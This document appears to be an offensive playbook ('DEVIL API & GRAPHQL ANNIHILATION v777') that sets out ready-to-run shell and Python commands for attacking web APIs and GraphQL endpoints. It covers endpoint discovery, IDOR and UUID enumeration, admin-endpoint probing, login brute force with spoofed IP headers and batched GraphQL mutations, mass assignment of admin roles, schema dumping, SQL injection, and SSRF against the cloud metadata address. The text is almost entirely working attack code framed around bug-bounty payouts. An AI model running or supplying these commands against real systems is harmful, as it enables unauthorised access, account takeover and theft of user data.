# DEVIL API & GRAPHQL ANNIHILATION v777

## ══════════════════════════════════════
## API SECURITY — FULL ATTACK PLAYBOOK
## ══════════════════════════════════════

### API Discovery
```bash
TARGET="https://target.com"

# 1. Find API endpoints via JS files
katana -u $TARGET -jc -silent 2>/dev/null | grep -oE '(https?://[^"]+/api/[^"]+)' | sort -u > api_endpoints.txt
gau $TARGET 2>/dev/null | grep "/api/" | sort -u >> api_endpoints.txt

# 2. Wordlist-based discovery
ffuf -u "$TARGET/FUZZ" -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,400,401,403,405 -t 50 -o api_fuzz.json

# 3. Common API paths
for path in api/v1 api/v2 api/v3 rest graphql gql admin/api internal/api \
            api/internal api/admin api/debug swagger openapi v1 v2; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$path" --max-time 5)
  [[ "$code" != "404" ]] && echo "FOUND [$code]: $TARGET/$path"
done

# 4. Swagger/OpenAPI docs
for doc in /swagger.json /swagger-ui.html /openapi.json /api-docs /api/swagger.json \
           /v1/api-docs /v2/api-docs /swagger/v1/swagger.json; do
  curl -so /dev/null -w "$doc → %{http_code}\n" "$TARGET$doc" --max-time 5
done
```

### BOLA/IDOR — Broken Object Level Authorization
```bash
# Enumerate user resources
TARGET="https://target.com"
TOKEN="YOUR_TOKEN"
VICTIM_ID=1337

# Numeric IDOR
for endpoint in users orders invoices documents reports accounts profiles; do
  for id in $(seq 1 200); do
    r=$(curl -so /dev/null -w "%{http_code}" \
      "$TARGET/api/$endpoint/$id" -H "Authorization: Bearer $TOKEN" --max-time 3)
    [[ "$r" == "200" ]] && echo "IDOR [$endpoint/$id]: HTTP 200" &
  done
done
wait

# UUID IDOR — use known valid UUIDs from your account, predict/enumerate others
# GUIDs are often sequential v1 UUIDs (timestamp-based)
python3 -c "
import uuid, time
now = int(time.time() * 1e7) + 0x01b21dd213814000  # UUID v1 epoch
for i in range(-100, 100):
    ts = now + i * 10000000  # ±1 second increments
    print(str(uuid.UUID(int=ts << 64, version=1)))
" | while read u; do
  curl -s "$TARGET/api/users/$u" -H "Authorization: Bearer $TOKEN" | grep -v "not found" &
done
wait

# Encoded ID IDOR
# base64: echo -n "user:1337" | base64 = dXNlcjoxMzM3
for id in $(seq 1 1000); do
  encoded=$(echo -n "user:$id" | base64)
  curl -s "$TARGET/api/data/$encoded" -H "Authorization: Bearer $TOKEN" | grep -v "404" &
done
```

### BFLA — Broken Function Level Authorization
```bash
# Try admin/privileged endpoints with regular user token
ADMIN_ENDPOINTS=(
  /api/admin /api/admin/users /api/admin/config
  /api/v1/admin /api/internal /api/system
  /api/users/all /api/reports/all /api/audit
  /management /actuator /actuator/env /actuator/beans
  /admin/dashboard /api/superuser
)

for ep in "${ADMIN_ENDPOINTS[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$TARGET$ep" -H "Authorization: Bearer $REGULAR_USER_TOKEN" --max-time 5)
  [[ "$code" != "403" && "$code" != "404" ]] && echo "BFLA [$code]: $TARGET$ep"
done

# Method override
curl -X GET "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-HTTP-Method-Override: GET"

# Try DELETE/PUT on endpoints that only whitelist GET/POST
curl -X DELETE "$TARGET/api/admin/user/1" -H "Authorization: Bearer $TOKEN"
curl -X PUT "$TARGET/api/admin/config" -H "Authorization: Bearer $TOKEN" \
  -d '{"maintenance_mode":false,"debug":true}'
```

### API Rate Limiting Bypass
```bash
# Rotate IP via headers
for i in $(seq 1 10000); do
  curl -X POST "$TARGET/api/login" \
    -H "X-Forwarded-For: $((RANDOM%254)).$((RANDOM%254)).$((RANDOM%254)).$((RANDOM%254))" \
    -H "X-Real-IP: $((RANDOM%254)).$((RANDOM%254)).$((RANDOM%254)).$((RANDOM%254))" \
    -d '{"username":"victim","password":"guess'$i'"}' &
done

# Use null byte in username
{"username":"admin\x00","password":"anything"}

# User agent rotation
# Different sessions per attempt
```

### Mass Assignment in REST APIs
```bash
# Step 1: GET user profile — see all fields
curl -s "$TARGET/api/users/me" -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Step 2: PATCH with extra privileged fields
curl -X PATCH "$TARGET/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ROXX",
    "role": "admin",
    "is_admin": true,
    "is_staff": true,
    "permissions": ["*"],
    "plan": "enterprise",
    "credits": 999999,
    "verified": true,
    "account_type": "superuser"
  }'

# Step 3: Verify if any stuck
curl -s "$TARGET/api/users/me" -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

---

## ══════════════════════════════════════
## GRAPHQL ATTACKS
## ══════════════════════════════════════

### Introspection — Full Schema Dump
```bash
# Check if introspection enabled
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | python3 -m json.tool

# Full schema dump
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } mutationType { fields { name description args { name type { name kind } } } } types { name fields { name type { name kind } } } } }"
  }' > schema.json

# Use graphql-voyager or graphql-cop for analysis
pip3 install graphql-cop --break-system-packages -q
graphql-cop -t $TARGET/graphql -H "Authorization: Bearer $TOKEN"
```

### GraphQL IDOR
```bash
# Query other users' data by changing ID
curl -s -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ user(id: 1337) { email password_hash ssn credit_card } }"}'

# List all users (if no auth on query)
curl -s -X POST "$TARGET/graphql" \
  -d '{"query":"{ users { id email role password_hash } }"}'
```

### GraphQL Batching — DoS / Rate Limit Bypass
```bash
# Batch 1000 login attempts in single HTTP request
python3 -c "
queries = []
passwords = open('/usr/share/wordlists/rockyou.txt').readlines()[:1000]
for i, pw in enumerate(passwords):
    pw = pw.strip().replace('\\\\','\\\\\\\\').replace('\"','\\\\\"')
    queries.append('{\"query\":\"mutation{login(username:\\\\\"admin\\\\\",password:\\\\\"%s\\\\\"){token}}\"}'% pw)
print('[' + ','.join(queries) + ']')
" | curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d @- | grep -i token
```

### GraphQL Injection
```bash
# IDOR via alias
curl -s -X POST "$TARGET/graphql" \
  -d '{
    "query": "{ 
      a: user(id:1){email}
      b: user(id:2){email}
      c: user(id:3){email}
    }"
  }'

# SQL injection in GraphQL argument
curl -s -X POST "$TARGET/graphql" \
  -d '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id email } }"}'

# SSRF via GraphQL URL field
curl -s -X POST "$TARGET/graphql" \
  -d '{"query":"{ importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}'
```

### GraphQL Subscription Attacks
```bash
# Websocket-based subscriptions — CSRF, auth bypass
wscat -c "wss://target.com/graphql" \
  --header "Authorization: Bearer TOKEN" \
  -x '{"type":"start","id":"1","payload":{"query":"subscription{allMessages{content sender}}"}}'
```

---

## ══════════════════════════════════════
## AUTOMATED API AUDIT
## ══════════════════════════════════════

```bash
#!/usr/bin/env bash
# Full API attack surface audit
TARGET="$1"
TOKEN="$2"
OUT="/home/roxx/findings/api-$(echo $TARGET | sed 's|https://||')"
mkdir -p "$OUT"

echo "[*] Discovering API endpoints..."
katana -u $TARGET -jc -silent 2>/dev/null | grep '/api/' | sort -u > "$OUT/endpoints.txt"
cat /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt | while read ep; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$ep" -H "Authorization: Bearer $TOKEN" --max-time 3)
  [[ "$code" != "404" ]] && echo "$code $TARGET$ep" | tee -a "$OUT/found.txt"
done

echo "[*] Testing GraphQL..."
curl -s -X POST "$TARGET/graphql" -d '{"query":"{__schema{types{name}}}"}' | \
  python3 -m json.tool > "$OUT/graphql_schema.json" 2>/dev/null

echo "[*] Running nuclei API templates..."
nuclei -u $TARGET -t ~/nuclei-templates/http/exposures/apis/ -H "Authorization: Bearer $TOKEN" \
  -o "$OUT/nuclei_api.txt" -silent 2>/dev/null

echo "[*] DONE → $OUT"
```

**IMPACT: Critical data exposure / privilege escalation | Bounty: $1,000–$50,000**
